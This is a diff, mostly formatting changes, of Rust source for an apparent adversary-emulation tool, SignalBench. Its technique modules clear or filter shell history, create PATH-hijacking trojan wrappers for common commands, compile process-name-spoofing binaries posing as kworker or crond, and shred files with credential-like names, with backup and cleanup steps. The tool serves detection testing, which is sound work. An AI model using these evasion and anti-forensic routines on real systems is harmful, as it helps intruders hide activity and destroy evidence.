-                            if is_suspicious && removed.len() < 10 {
-                                removed.push(line.to_string());
-                            }
-                            
-                            !is_suspicious
-                        })
-                        .copied()
-                        .collect();
-                    
-                    let new_content = filtered_lines.join("\n");
-                    let removed_count = original_count - filtered_lines.len();
-                    
-                    (new_content, removed_count, removed)
-                };
+                let (modified_content, entries_removed, removed_samples) =
+                    if clear_method == "truncate" {
+                        // Truncate to empty
+                        writeln!(log_file, "  Method: Truncating to 0 bytes")
+                            .map_err(|e| format!("Failed to write: {e}"))?;
+                        (
+                            String::new(),
+                            original_count,
+                            original_lines
+                                .iter()
+                                .take(10)
+                                .map(|s| s.to_string())
+                                .collect::<Vec<_>>(),
+                        )
+                    } else {
+                        // Filter suspicious patterns
+                        writeln!(log_file, "  Method: Filtering suspicious patterns")
+                            .map_err(|e| format!("Failed to write: {e}"))?;
+
+                        let mut removed = Vec::new();
+                        let filtered_lines: Vec<&str> = original_lines
+                            .iter()
+                            .filter(|line| {
+                                let is_suspicious = suspicious_patterns
+                                    .iter()
+                                    .any(|pattern| line.contains(pattern));
+
+                                if is_suspicious && removed.len() < 10 {
+                                    removed.push(line.to_string());
+                                }
+
+                                !is_suspicious
+                            })
+                            .copied()
+                            .collect();
+
+                        let new_content = filtered_lines.join("\n");
+                        let removed_count = original_count - filtered_lines.len();
+
+                        (new_content, removed_count, removed)
+                    };
 
                 // Write modified content back
                 fs::write(history_path, &modified_content)
                     .map_err(|e| format!("Failed to write modified content: {e}"))?;
-                
+
                 // Restore original permissions
                 fs::set_permissions(history_path, fs::Permissions::from_mode(original_perms))
                     .map_err(|e| format!("Failed to set permissions: {e}"))?;
@@ -818,7 +958,7 @@ impl AttackTechnique for ClearBashHistory {
                     .map_err(|e| format!("Failed to write: {e}"))?;
                 writeln!(log_file, "  Entries removed: {entries_removed}")
                     .map_err(|e| format!("Failed to write: {e}"))?;
-                
+
                 if !removed_samples.is_empty() {
                     writeln!(log_file, "  Sample of removed entries (first 10):")
                         .map_err(|e| format!("Failed to write: {e}"))?;
@@ -827,9 +967,8 @@ impl AttackTechnique for ClearBashHistory {
                             .map_err(|e| format!("Failed to write: {e}"))?;
                     }
                 }
-                
-                writeln!(log_file)
-                    .map_err(|e| format!("Failed to write: {e}"))?;
+
+                writeln!(log_file).map_err(|e| format!("Failed to write: {e}"))?;
 
                 // Track in artifacts
                 if let Some(files) = artifacts_data["files_modified"].as_array_mut() {
@@ -846,8 +985,7 @@ impl AttackTechnique for ClearBashHistory {
                 total_entries_removed += entries_removed;
             }
 
-            writeln!(log_file, "\n=== Summary ===")
-                .map_err(|e| format!("Failed to write: {e}"))?;
+            writeln!(log_file, "\n=== Summary ===").map_err(|e| format!("Failed to write: {e}"))?;
             writeln!(log_file, "Files modified: {total_files_modified}")
                 .map_err(|e| format!("Failed to write: {e}"))?;
             writeln!(log_file, "Total entries removed: {total_entries_removed}")
@@ -862,9 +1000,12 @@ impl AttackTechnique for ClearBashHistory {
             // Save artifacts JSON
             let mut artifacts_file = File::create(&artifacts_json)
                 .map_err(|e| format!("Failed to create artifacts file: {e}"))?;
-            artifacts_file.write_all(serde_json::to_string_pretty(&artifacts_data)
-                .map_err(|e| format!("Failed to serialise artifacts: {e}"))?
-                .as_bytes())
+            artifacts_file
+                .write_all(
+                    serde_json::to_string_pretty(&artifacts_data)
+                        .map_err(|e| format!("Failed to serialise artifacts: {e}"))?
+                        .as_bytes(),
+                )
                 .map_err(|e| format!("Failed to write artifacts: {e}"))?;
 
             info!("Modified {total_files_modified} history files, removed {total_entries_removed} entries");
@@ -884,15 +1025,17 @@ impl AttackTechnique for ClearBashHistory {
     fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
         Box::pin(async move {
             use std::os::unix::fs::PermissionsExt;
-            
+
             info!("=== Restoring Shell History Files ===");
 
             // Find the backup directory and artifacts JSON
-            let _backup_dir = artifacts.iter()
+            let _backup_dir = artifacts
+                .iter()
                 .find(|a| a.contains("history_backup_"))
                 .cloned();
-            
-            let artifacts_json = artifacts.iter()
+
+            let artifacts_json = artifacts
+                .iter()
                 .find(|a| a.contains("artifacts_") && a.ends_with(".json"))
                 .cloned();
 
@@ -901,18 +1044,23 @@ impl AttackTechnique for ClearBashHistory {
                     // Read artifacts to get restoration information
                     match fs::read_to_string(&artifacts_path) {
                         Ok(content) => {
-                            if let Ok(artifacts_data) = serde_json::from_str::<serde_json::Value>(&content) {
+                            if let Ok(artifacts_data) =
+                                serde_json::from_str::<serde_json::Value>(&content)
+                            {
                                 if let Some(files) = artifacts_data["files_modified"].as_array() {
                                     info!("Restoring {} history files from backup...", files.len());
-                                    
+
                                     let mut restored_count = 0;
                                     let mut failed_count = 0;
 
                                     for file_info in files {
-                                        let original_path = file_info["path"].as_str().unwrap_or("");
-                                        let backup_path = file_info["backup_path"].as_str().unwrap_or("");
-                                        let perms_str = file_info["permissions"].as_str().unwrap_or("600");
-                                        
+                                        let original_path =
+                                            file_info["path"].as_str().unwrap_or("");
+                                        let backup_path =
+                                            file_info["backup_path"].as_str().unwrap_or("");
+                                        let perms_str =
+                                            file_info["permissions"].as_str().unwrap_or("600");
+
                                         if original_path.is_empty() || backup_path.is_empty() {
                                             continue;
                                         }
@@ -927,26 +1075,29 @@ impl AttackTechnique for ClearBashHistory {
                                         match fs::copy(backup_path, original_path) {
                                             Ok(_) => {
                                                 info!("  [OK] Restored: {original_path}");
-                                                
+
                                                 // Restore original permissions
-                                                if let Ok(perms_mode) = u32::from_str_radix(perms_str, 8) {
+                                                if let Ok(perms_mode) =
+                                                    u32::from_str_radix(perms_str, 8)
+                                                {
                                                     let _ = fs::set_permissions(
                                                         original_path,
-                                                        fs::Permissions::from_mode(perms_mode)
+                                                        fs::Permissions::from_mode(perms_mode),
                                                     );
                                                     info!("    Permissions set to: {perms_str}");
                                                 }
-                                                
+
                                                 // Verify restoration
                                                 if let Ok(metadata) = fs::metadata(original_path) {
-                                                    let current_perms = metadata.permissions().mode();
+                                                    let current_perms =
+                                                        metadata.permissions().mode();
                                                     info!("    Verification: file exists, mode: {current_perms:o}");
                                                 }
-                                                
+
                                                 restored_count += 1;
                                             }
                                             Err(e) => {
-                                                warn!("  ✗ Failed to restore {original_path}: {e}");
+                                                warn!("  [FAIL] Failed to restore {original_path}: {e}");
                                                 failed_count += 1;
                                             }
                                         }
@@ -968,7 +1119,7 @@ impl AttackTechnique for ClearBashHistory {
             // Remove backup directory and all artifacts
             for artifact in artifacts {
                 let artifact_path = Path::new(artifact);
-                
+
                 if artifact_path.exists() {
                     if artifact_path.is_dir() {
                         match fs::remove_dir_all(artifact) {
@@ -1022,34 +1173,30 @@ impl AttackTechnique for ModifyEnvironmentVariable {
         }
     }
 
-    fn execute<'a>(
-        &'a self,
-        config: &'a TechniqueConfig,
-        dry_run: bool,
-    ) -> ExecuteFuture<'a> {
+    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
         Box::pin(async move {
-            use tokio::process::Command;
             use std::os::unix::fs::PermissionsExt;
+            use tokio::process::Command;
             use uuid::Uuid;
-            
+
             // Generate unique session ID for this execution
             let session_id = Uuid::new_v4().to_string()[..8].to_string();
-            
+
             let hijack_dir = config
                 .parameters
                 .get("hijack_directory")
                 .unwrap_or(&"/tmp/signalbench_path_hijack".to_string())
                 .clone();
-            
+
             let intercept_log_base = config
                 .parameters
                 .get("intercept_log")
                 .unwrap_or(&"/tmp/signalbench_path_intercept".to_string())
                 .clone();
-            
+
             // Append session_id to log file name
             let intercept_log = format!("{intercept_log_base}_{session_id}.log");
-            
+
             if dry_run {
                 info!("[DRY RUN] Would create trojan binaries in {hijack_dir} and hijack PATH");
                 info!("[DRY RUN] Session ID: {session_id}");
@@ -1057,7 +1204,9 @@ impl AttackTechnique for ModifyEnvironmentVariable {
                 return Ok(SimulationResult {
                     technique_id: self.info().id,
                     success: true,
-                    message: format!("DRY RUN: Would create 7 trojan binaries (session: {session_id})"),
+                    message: format!(
+                        "DRY RUN: Would create 7 trojan binaries (session: {session_id})"
+                    ),
                     artifacts: vec![hijack_dir, intercept_log],
                     cleanup_required: false,
                 });
@@ -1086,14 +1235,16 @@ impl AttackTechnique for ModifyEnvironmentVariable {
                     continue;
                 }
 
-                let real_path = String::from_utf8_lossy(&which_output.stdout).trim().to_string();
-                
+                let real_path = String::from_utf8_lossy(&which_output.stdout)
+                    .trim()
+                    .to_string();
+
                 // Verify the real binary path is not our hijack directory
                 if real_path.starts_with(&hijack_dir) {
                     warn!("Real binary path for {cmd_name} is in hijack directory, skipping");
                     continue;
                 }
-                
+
                 trojan_specs.push((*cmd_name, real_path));
             }
 
@@ -1101,7 +1252,7 @@ impl AttackTechnique for ModifyEnvironmentVariable {
 
             for (cmd_name, real_path) in &trojan_specs {
                 let trojan_path = format!("{hijack_dir}/{cmd_name}");
-                
+
                 // Create the trojan script with enhanced logging
                 let trojan_script = format!(
                     r#"#!/bin/sh
@@ -1125,10 +1276,11 @@ exit $?
 
                 let mut trojan_file = File::create(&trojan_path)
                     .map_err(|e| format!("Failed to create trojan {cmd_name}: {e}"))?;
-                
-                trojan_file.write_all(trojan_script.as_bytes())
+
+                trojan_file
+                    .write_all(trojan_script.as_bytes())
                     .map_err(|e| format!("Failed to write trojan {cmd_name}: {e}"))?;
-                
+
                 // Make the trojan executable
                 let metadata = fs::metadata(&trojan_path)
                     .map_err(|e| format!("Failed to get metadata for {cmd_name}: {e}"))?;
@@ -1136,7 +1288,7 @@ exit $?
                 permissions.set_mode(0o755);
                 fs::set_permissions(&trojan_path, permissions)
                     .map_err(|e| format!("Failed to set permissions for {cmd_name}: {e}"))?;
-                
+
                 created_trojans.push(trojan_path.clone());
                 info!("Created trojan binary: {trojan_path}");
             }
@@ -1144,36 +1296,45 @@ exit $?
             // Initialise the intercept log with session information
             let mut log_file = File::create(&intercept_log)
                 .map_err(|e| format!("Failed to create intercept log: {e}"))?;
-            writeln!(log_file, "=== SignalBench PATH Interception Log (GoCortex.io v1.5.13) ===")
-                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
+            writeln!(
+                log_file,
+                "=== SignalBench PATH Interception Log (GoCortex.io v1.5.13) ==="
+            )
+            .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
             writeln!(log_file, "Session ID: {session_id}")
                 .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
-            writeln!(log_file, "Session started: {}", chrono::Local::now().to_rfc3339())
-                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
-            writeln!(log_file, "Intercepted binaries: ls, ps, whoami, sudo, ssh, curl, wget")
-                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
-            writeln!(log_file)
-                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
+            writeln!(
+                log_file,
+                "Session started: {}",
+                chrono::Local::now().to_rfc3339()
+            )
+            .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
+            writeln!(
+                log_file,
+                "Intercepted binaries: ls, ps, whoami, sudo, ssh, curl, wget"
+            )
+            .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
+            writeln!(log_file).map_err(|e| format!("Failed to write to intercept log: {e}"))?;
 
             // Get original PATH
-            let original_path = std::env::var("PATH").unwrap_or_else(|_| "/usr/bin:/bin".to_string());
+            let original_path =
+                std::env::var("PATH").unwrap_or_else(|_| "/usr/bin:/bin".to_string());
             info!("Original PATH: {original_path}");
 
             // Document PATH hijacking configuration
             let new_path = format!("{hijack_dir}:{original_path}");
             writeln!(log_file, "=== PATH Hijacking Configuration ===")
                 .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
-            writeln!(log_file,"Trojan directory: {hijack_dir}")
+            writeln!(log_file, "Trojan directory: {hijack_dir}")
                 .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
-            writeln!(log_file,"Original PATH: {original_path}")
+            writeln!(log_file, "Original PATH: {original_path}")
                 .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
-            writeln!(log_file,"Hijacked PATH: {new_path}")
+            writeln!(log_file, "Hijacked PATH: {new_path}")
                 .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
-            writeln!(log_file)
-                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
+            writeln!(log_file).map_err(|e| format!("Failed to write to intercept log: {e}"))?;
             writeln!(log_file, "To test PATH interception, execute:")
                 .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
-            writeln!(log_file,"  export PATH={hijack_dir}:$PATH")
+            writeln!(log_file, "  export PATH={hijack_dir}:$PATH")
                 .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
             writeln!(log_file, "  ls -la")
                 .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
@@ -1189,8 +1350,7 @@ exit $?
                 .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
             writeln!(log_file, "  wget https://example.com/file.txt")
                 .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
-            writeln!(log_file)
-                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
+            writeln!(log_file).map_err(|e| format!("Failed to write to intercept log: {e}"))?;
             writeln!(log_file, "All intercepted commands will be logged with:")
                 .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
             writeln!(log_file, "  - Timestamp (ISO 8601)")
@@ -1201,14 +1361,16 @@ exit $?
                 .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
             writeln!(log_file, "  - Full command line with arguments")
                 .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
-            writeln!(log_file)
-                .map_err(|e| format!("Failed to write to intercept log: {e}"))?;
+            writeln!(log_file).map_err(|e| format!("Failed to write to intercept log: {e}"))?;
 
             drop(log_file); // Close the log file
 
             info!("PATH hijacking ready - trojans will intercept commands when PATH={hijack_dir}:$PATH");
             info!("PATH hijacking telemetry generated:");
-            info!("  • {} trojan binaries created (ls, ps, whoami, sudo, ssh, curl, wget)", created_trojans.len());
+            info!(
+                "  • {} trojan binaries created (ls, ps, whoami, sudo, ssh, curl, wget)",
+                created_trojans.len()
+            );
             info!("  • PATH hijacking configured: {new_path}");
             info!("  • Enhanced logging: timestamp, user, PID, full arguments");
             info!("  • Interception ready - commands will be logged when PATH is modified");
@@ -1236,7 +1398,7 @@ exit $?
         Box::pin(async move {
             for artifact in artifacts {
                 let artifact_path = Path::new(artifact);
-                
+
                 if artifact_path.is_dir() {
                     match fs::remove_dir_all(artifact) {
                         Ok(_) => info!("Removed trojan directory: {artifact}"),
@@ -1272,17 +1434,13 @@ impl AttackTechnique for MasqueradingAsCrond {
         }
     }
 
-    fn execute<'a>(
-        &'a self,
-        _config: &'a TechniqueConfig,
-        dry_run: bool,
-    ) -> ExecuteFuture<'a> {
+    fn execute<'a>(&'a self, _config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
         Box::pin(async move {
             use tokio::process::Command;
-            
+
             let id = Uuid::new_v4().simple().to_string();
             let work_dir = format!("/tmp/signalbench_masquerade_{id}");
-            
+
             if dry_run {
                 info!("[DRY RUN] Would compile REAL C binaries with process name spoofing:");
                 info!("[DRY RUN]   - [kworker/0:0] (kernel worker spoofing)");
@@ -1292,14 +1450,15 @@ impl AttackTechnique for MasqueradingAsCrond {
                 return Ok(SimulationResult {
                     technique_id: self.info().id,
                     success: true,
-                    message: "DRY RUN: Would compile and execute REAL masquerading binaries".to_string(),
+                    message: "DRY RUN: Would compile and execute REAL masquerading binaries"
+                        .to_string(),
                     artifacts: vec![work_dir],
                     cleanup_required: false,
                 });
             }
 
             info!("Creating process masquerading binaries in {work_dir}");
-            
+
             fs::create_dir_all(&work_dir)
                 .map_err(|e| format!("Failed to create work directory: {e}"))?;
 
@@ -1308,7 +1467,8 @@ impl AttackTechnique for MasqueradingAsCrond {
             let mut running_pids = Vec::new();
 
             let c_source_template = |process_name: &str| -> String {
-                format!("#include <stdio.h>\n\
+                format!(
+                    "#include <stdio.h>\n\
                     #include <stdlib.h>\n\
                     #include <unistd.h>\n\
                     #include <sys/prctl.h>\n\
@@ -1333,48 +1493,48 @@ impl AttackTechnique for MasqueradingAsCrond {
                 ("crond", "crond"),
             ];
 
-            info!("Compiling {} C binaries with process name spoofing", binaries.len());
+            info!(
+                "Compiling {} C binaries with process name spoofing",
+                binaries.len()
+            );
 
             for (spoof_name, safe_filename) in &binaries {
                 let source_file = format!("{work_dir}/{safe_filename}.c");
                 let binary_file = format!("{work_dir}/{safe_filename}");
-                
+
                 let source_code = c_source_template(spoof_name);
                 fs::write(&source_file, source_code.as_bytes())
                     .map_err(|e| format!("Failed to write C source for {spoof_name}: {e}"))?;
                 artifacts.push(source_file.clone());
-                
+
                 info!("Compiling {spoof_name} binary with gcc");
                 let compile_output = Command::new("gcc")
-                    .args([
-                        &source_file,
-                        "-o",
-                        &binary_file,
-                        "-std=c99",
-                    ])
+                    .args([&source_file, "-o", &binary_file, "-std=c99"])
                     .output()
                     .await
                     .map_err(|e| format!("Failed to compile {spoof_name}: {e}"))?;
-                
+
                 if !compile_output.status.success() {
                     let stderr = String::from_utf8_lossy(&compile_output.stderr);
                     return Err(format!("Compilation failed for {spoof_name}: {stderr}"));
                 }
-                
+
                 artifacts.push(binary_file.clone());
                 binaries_created.push(format!("{safe_filename} -> {spoof_name}"));
-                
-                info!("Executing masquerading binary: {safe_filename} (will appear as {spoof_name})");
+
+                info!(
+                    "Executing masquerading binary: {safe_filename} (will appear as {spoof_name})"
+                );
                 let child = Command::new(&binary_file)
                     .spawn()
                     .map_err(|e| format!("Failed to execute {spoof_name}: {e}"))?;
-                
+
                 let pid = child.id().ok_or("Failed to get PID")?;
                 running_pids.push(pid);
                 artifacts.push(format!("pid_{pid}"));
-                
+
                 info!("[OK] Binary running with PID {pid}, spoofing as {spoof_name}");
-                
+
                 tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
             }
 
@@ -1384,21 +1544,25 @@ impl AttackTechnique for MasqueradingAsCrond {
                 .output()
                 .await
                 .map_err(|e| format!("Failed to run ps: {e}"))?;
-            
+
             let ps_text = String::from_utf8_lossy(&ps_output.stdout);
             let mut verified_count = 0;
-            
+
             for (spoof_name, _) in &binaries {
                 if ps_text.contains(spoof_name) {
                     info!("[OK] Verified: '{spoof_name}' appears in ps output");
                     verified_count += 1;
                 } else {
-                    warn!("⚠ Warning: '{spoof_name}' not found in ps output");
+                    warn!("[WARN] Warning: '{spoof_name}' not found in ps output");
                 }
             }
-            
-            info!("Masquerading complete: {} binaries running, {} verified in ps", running_pids.len(), verified_count);
-            
+
+            info!(
+                "Masquerading complete: {} binaries running, {} verified in ps",
+                running_pids.len(),
+                verified_count
+            );
+
             Ok(SimulationResult {
                 technique_id: self.info().id,
                 success: true,
@@ -1412,7 +1576,7 @@ impl AttackTechnique for MasqueradingAsCrond {
     fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
         Box::pin(async move {
             use tokio::process::Command;
-            
+
             for artifact in artifacts {
                 if artifact.starts_with("pid_") {
                     let pid_str = artifact.trim_start_matches("pid_");
@@ -1423,7 +1587,7 @@ impl AttackTechnique for MasqueradingAsCrond {
                             .output()
                             .await
                             .ok();
-                        
+
                         tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                     }
                 } else if Path::new(artifact).is_dir() {
@@ -1481,14 +1645,10 @@ impl AttackTechnique for FileDeletion {
         }
     }
 
-    fn execute<'a>(
-        &'a self,
-        config: &'a TechniqueConfig,
-        dry_run: bool,
-    ) -> ExecuteFuture<'a> {
+    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
         Box::pin(async move {
             use tokio::process::Command;
-            
+
             let test_files_count = config
                 .parameters
                 .get("test_files_count")
@@ -1496,24 +1656,26 @@ impl AttackTechnique for FileDeletion {
                 .parse::<usize>()
                 .unwrap_or(10)
                 .min(50);
-            
+
             let use_shred = config
                 .parameters
                 .get("use_shred")
                 .unwrap_or(&"true".to_string())
-                .to_lowercase() == "true";
-            
+                .to_lowercase()
+                == "true";
+
             let simulate_log_tampering = config
                 .parameters
                 .get("simulate_log_tampering")
                 .unwrap_or(&"true".to_string())
-                .to_lowercase() == "true";
-            
+                .to_lowercase()
+                == "true";
+
             let session_id = Uuid::new_v4().to_string().replace("-", "");
             let test_dir = format!("/tmp/signalbench_deletion_test_{session_id}");
             let backup_dir = format!("/tmp/signalbench_deletion_backup_{session_id}");
             let log_file = format!("/tmp/signalbench_deletion_{session_id}.log");
-            
+
             if dry_run {
                 info!("[DRY RUN] Would demonstrate file deletion techniques:");
                 info!("[DRY RUN]   Test files: {test_files_count}");
@@ -1531,30 +1693,31 @@ impl AttackTechnique for FileDeletion {
             }
 
             info!("Starting file deletion demonstration (Session: {session_id})...");
-            
-            let mut log = File::create(&log_file)
-                .map_err(|e| format!("Failed to create log file: {e}"))?;
-            
+
+            let mut log =
+                File::create(&log_file).map_err(|e| format!("Failed to create log file: {e}"))?;
+
             writeln!(log, "=== SignalBench File Deletion Demonstration ===").unwrap();
             writeln!(log, "Session ID: {session_id}").unwrap();
             writeln!(log, "Timestamp: {}", chrono::Local::now()).unwrap();
             writeln!(log).unwrap();
-            
+
             let artifacts = vec![test_dir.clone(), backup_dir.clone(), log_file.clone()];
-            
+
             // Create test directory and backup directory
             info!("Creating test directory: {test_dir}");
             fs::create_dir_all(&test_dir)
                 .map_err(|e| format!("Failed to create test directory: {e}"))?;
-            
+
             fs::create_dir_all(&backup_dir)
                 .map_err(|e| format!("Failed to create backup directory: {e}"))?;
-            
+
             // Phase 1: Create test files with sensitive-looking names
             info!("Phase 1: Creating {test_files_count} test files...");
             writeln!(log, "=== Phase 1: Test File Creation ===").unwrap();
-            
-            let sensitive_names = ["credentials.txt",
+
+            let sensitive_names = [
+                "credentials.txt",
                 "passwords.db",
                 "secret_key.pem",
                 "api_tokens.conf",
@@ -1563,8 +1726,9 @@ impl AttackTechnique for FileDeletion {
                 "ssh_private_key",
                 "database_backup.sql",
                 "company_secrets.txt",
-                "access_tokens.json"];
-            
+                "access_tokens.json",
+            ];
+
             let mut created_files = Vec::new();
             for i in 0..test_files_count {
                 let file_name = if i < sensitive_names.len() {
@@ -1572,7 +1736,7 @@ impl AttackTechnique for FileDeletion {
                 } else {
                     &format!("sensitive_file_{i}.txt")
                 };
-                
+
                 let file_path = format!("{test_dir}/{file_name}");
                 let content = format!(
                     "SENSITIVE TEST DATA - Session {}\nFile: {}\nCreated: {}\nThis is test data for file deletion demonstration.\nPassword: test_password_{}\nAPI_KEY: FAKE_KEY_{}\n",
@@ -1582,47 +1746,47 @@ impl AttackTechnique for FileDeletion {
                     i,
                     i
                 );
-                
+
                 fs::write(&file_path, content.as_bytes())
                     .map_err(|e| format!("Failed to create test file: {e}"))?;
-                
+
                 created_files.push(file_path.clone());
                 writeln!(log, "Created: {file_name}").unwrap();
             }
-            
+
             info!("Created {} test files", created_files.len());
             writeln!(log, "Total files created: {}", created_files.len()).unwrap();
             writeln!(log).unwrap();
-            
+
             // Phase 2: Backup test files BEFORE deletion
             info!("Phase 2: Backing up test files to {backup_dir}...");
             writeln!(log, "=== Phase 2: File Backup ===").unwrap();
-            
+
             for file_path in &created_files {
                 let file_name = Path::new(file_path).file_name().unwrap().to_str().unwrap();
                 let backup_path = format!("{backup_dir}/{file_name}");
-                
+
                 fs::copy(file_path, &backup_path)
                     .map_err(|e| format!("Failed to backup file: {e}"))?;
-                
+
                 writeln!(log, "Backed up: {file_name} -> {backup_path}").unwrap();
             }
-            
+
             info!("Backed up {} files", created_files.len());
             writeln!(log).unwrap();
-            
+
             // Phase 3: Demonstrate deletion methods
             info!("Phase 3: Demonstrating file deletion methods...");
             writeln!(log, "=== Phase 3: File Deletion Methods ===").unwrap();
-            
+
             let mut deletion_results = Vec::new();
             let force_mode = config.force;
-            
+
             if force_mode {
                 info!("[T1070.004] [FORCE] Force mode - will attempt ALL deletion methods (shred, wipe, rm) for each file");
                 writeln!(log, "[FORCE] Force mode enabled - attempting ALL deletion methods for maximum telemetry").unwrap();
             }
-            
+
             // Check if shred is available
             let shred_available = Command::new("which")
                 .arg("shred")
@@ -1630,9 +1794,9 @@ impl AttackTechnique for FileDeletion {
                 .await
                 .map(|o| o.status.success())
                 .unwrap_or(false);
-            
+
             writeln!(log, "shred available: {shred_available}").unwrap();
-            
+
             // Check if wipe is available
             let wipe_available = Command::new("which")
                 .arg("wipe")
@@ -1640,16 +1804,16 @@ impl AttackTechnique for FileDeletion {
                 .await
                 .map(|o| o.status.success())
                 .unwrap_or(false);
-            
+
             writeln!(log, "wipe available: {wipe_available}").unwrap();
             writeln!(log).unwrap();
-            
+
             // Delete files using different methods
             // Force mode: run ALL methods for each file (maximum telemetry)
             // Normal mode: cycle between methods
             for (idx, file_path) in created_files.iter().enumerate() {
                 let file_name = Path::new(file_path).file_name().unwrap().to_str().unwrap();
-                
+
                 // Force mode: attempt ALL deletion methods for maximum telemetry
                 // (each method will fail after the first succeeds, but the ATTEMPT generates detection)
                 let use_shred_for_file = if force_mode {
@@ -1657,106 +1821,142 @@ impl AttackTechnique for FileDeletion {
                 } else {
                     idx % 3 == 0 && use_shred && shred_available
                 };
-                
+
                 let use_wipe_for_file = if force_mode {
                     wipe_available || force_mode
                 } else {
                     idx % 3 == 1 && wipe_available
                 };
-                
-                let use_rm_for_file = force_mode || idx % 3 == 2 || (!use_shred_for_file && !use_wipe_for_file);
-                
+
+                let use_rm_for_file =
+                    force_mode || idx % 3 == 2 || (!use_shred_for_file && !use_wipe_for_file);
+
                 // Method 1: shred with 3 overwrite passes
                 if use_shred_for_file {
                     if force_mode && !shred_available {
-                        info!("[T1070.004] [FORCE] Attempting shred despite not being found on PATH");
+                        info!(
+                            "[T1070.004] [FORCE] Attempting shred despite not being found on PATH"
+                        );
                     }
                     info!("Shredding file: {file_name} (3 passes)");
                     writeln!(log, "Deleting {file_name} using shred -uvz -n 3").unwrap();
-                    
+
                     let shred_output = Command::new("shred")
                         .args(["-uvz", "-n", "3", file_path])
                         .output()
                         .await;
-                    
+
                     match shred_output {
                         Ok(output) if output.status.success() => {
-                            deletion_results.push((file_name.to_string(), "shred -n 3".to_string(), true));
+                            deletion_results.push((
+                                file_name.to_string(),
+                                "shred -n 3".to_string(),
+                                true,
+                            ));
                             writeln!(log, "[OK] Successfully shredded: {file_name}").unwrap();
                         }
                         Ok(output) => {
                             let stderr = String::from_utf8_lossy(&output.stderr);
                             writeln!(log, "[FAIL] shred failed for {file_name}: {stderr}").unwrap();
-                            deletion_results.push((file_name.to_string(), "shred -n 3".to_string(), false));
+                            deletion_results.push((
+                                file_name.to_string(),
+                                "shred -n 3".to_string(),
+                                false,
+                            ));
                         }
                         Err(e) => {
-                            writeln!(log, "[FAIL] Failed to execute shred for {file_name}: {e}").unwrap();
-                            deletion_results.push((file_name.to_string(), "shred -n 3".to_string(), false));
+                            writeln!(log, "[FAIL] Failed to execute shred for {file_name}: {e}")
+                                .unwrap();
+                            deletion_results.push((
+                                file_name.to_string(),
+                                "shred -n 3".to_string(),
+                                false,
+                            ));
                         }
                     }
                 }
-                
+
                 // Method 2: wipe (if available or force mode)
                 if use_wipe_for_file {
                     if force_mode && !wipe_available {
-                        info!("[T1070.004] [FORCE] Attempting wipe despite not being found on PATH");
+                        info!(
+                            "[T1070.004] [FORCE] Attempting wipe despite not being found on PATH"
+                        );
                     }
                     info!("Wiping file: {file_name}");
                     writeln!(log, "Deleting {file_name} using wipe -f").unwrap();
-                    
-                    let wipe_output = Command::new("wipe")
-                        .args(["-f", file_path])
-                        .output()
-                        .await;
-                    
+
+                    let wipe_output = Command::new("wipe").args(["-f", file_path]).output().await;
+
                     match wipe_output {
                         Ok(output) if output.status.success() => {
-                            deletion_results.push((file_name.to_string(), "wipe -f".to_string(), true));
+                            deletion_results.push((
+                                file_name.to_string(),
+                                "wipe -f".to_string(),
+                                true,
+                            ));
                             writeln!(log, "[OK] Successfully wiped: {file_name}").unwrap();
                         }
                         Ok(_) => {
-                            deletion_results.push((file_name.to_string(), "wipe -f".to_string(), false));
+                            deletion_results.push((
+                                file_name.to_string(),
+                                "wipe -f".to_string(),
+                                false,
+                            ));
                             writeln!(log, "[FAIL] wipe failed for {file_name}").unwrap();
                         }
                         Err(e) => {
-                            writeln!(log, "[FAIL] Failed to execute wipe for {file_name}: {e}").unwrap();
-                            deletion_results.push((file_name.to_string(), "wipe -f".to_string(), false));
+                            writeln!(log, "[FAIL] Failed to execute wipe for {file_name}: {e}")
+                                .unwrap();
+                            deletion_results.push((
+                                file_name.to_string(),
+                                "wipe -f".to_string(),
+                                false,
+                            ));
                         }
                     }
                 }
-                
+
                 // Method 3: Simple rm -f
                 if use_rm_for_file {
                     info!("Removing file: {file_name} (rm -f)");
                     writeln!(log, "Deleting {file_name} using rm -f").unwrap();
-                    
+
                     match fs::remove_file(file_path) {
                         Ok(_) => {
-                            deletion_results.push((file_name.to_string(), "rm -f".to_string(), true));
+                            deletion_results.push((
+                                file_name.to_string(),
+                                "rm -f".to_string(),
+                                true,
+                            ));
                             writeln!(log, "[OK] Successfully removed: {file_name}").unwrap();
                         }
                         Err(e) => {
                             writeln!(log, "[FAIL] rm failed for {file_name}: {e}").unwrap();
-                            deletion_results.push((file_name.to_string(), "rm -f".to_string(), false));
+                            deletion_results.push((
+                                file_name.to_string(),
+                                "rm -f".to_string(),
+                                false,
+                            ));
                         }
                     }
                 }
             }
-            
+
             writeln!(log).unwrap();
-            
+
             // Phase 4: Log tampering simulation (if enabled)
             if simulate_log_tampering {
                 info!("Phase 4: Simulating log tampering...");
                 writeln!(log, "=== Phase 4: Log Tampering Simulation ===").unwrap();
-                
+
                 let fake_log_dir = format!("{test_dir}/fake_logs");
